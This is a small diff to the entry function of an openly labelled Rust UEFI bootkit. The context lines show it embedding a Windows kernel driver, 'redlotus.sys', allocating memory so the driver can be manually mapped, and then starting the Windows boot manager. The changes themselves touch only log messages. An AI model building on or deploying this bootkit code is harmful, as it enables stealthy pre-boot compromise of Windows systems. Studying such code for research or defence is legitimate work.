@@ -53,7 +53,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     // Use COM2 port with level filter Info
     com_logger::builder().base(0x2f8).filter(LevelFilter::Info).setup();
 
-    log::info!("### UEFI Bootkit in Rust by memN0ps ###");
+    log::info!("### UEFI Bootkit in Rust by memN0ps ###\n\n");
     
     let boot_services = system_table.boot_services();
     unsafe { boot_services.set_image_handle(image_handle) };
@@ -66,11 +66,11 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     // Read Windows kernel driver from disk as bytes and data in global variable for later
     let mut driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/redlotus.sys").to_vec();
     
-    log::info!("[+] Driver Bytes Address: {:#p}", driver_bytes.as_mut_ptr());
-    log::info!("[+] Driver Bytes Length: {:#x}", driver_bytes.len());
+    log::info!("[+] RedLotus.sys Bytes Address: {:#p}", driver_bytes.as_mut_ptr());
+    log::info!("[+] RedLotus.sys Bytes Length: {:#x}", driver_bytes.len());
 
     let nt_headers = unsafe { get_nt_headers(driver_bytes.as_mut_ptr()).unwrap() };
-    log::info!("[+] Driver SizeOfImage: {:#x}", unsafe { (*nt_headers).OptionalHeader.SizeOfImage as u64 });
+    log::info!("[+] RedLotus.sys SizeOfImage: {:#x}", unsafe { (*nt_headers).OptionalHeader.SizeOfImage as u64 });
     unsafe { DRIVER_IMAGE_SIZE = (*nt_headers).OptionalHeader.SizeOfImage as u64 };
 
     /* Allocates memory pages from the system for the Windows kernel driver to manually map */
@@ -92,8 +92,8 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     system_table.boot_services().stall(10_000_000);
 
     /* Start Windows EFI Boot Manager (bootmgfw.efi) */
-    log::info!("[+] Starting image...");
-    boot_services.start_image(bootmgfw_handle).expect("[-] Failed to start image");
+    log::info!("[+] Starting Windows EFI Boot Manager (bootmgfw.efi)...\n\n");
+    boot_services.start_image(bootmgfw_handle).expect("[-] Failed to start Windows EFI Boot Manager");
 
     Status::SUCCESS
 }
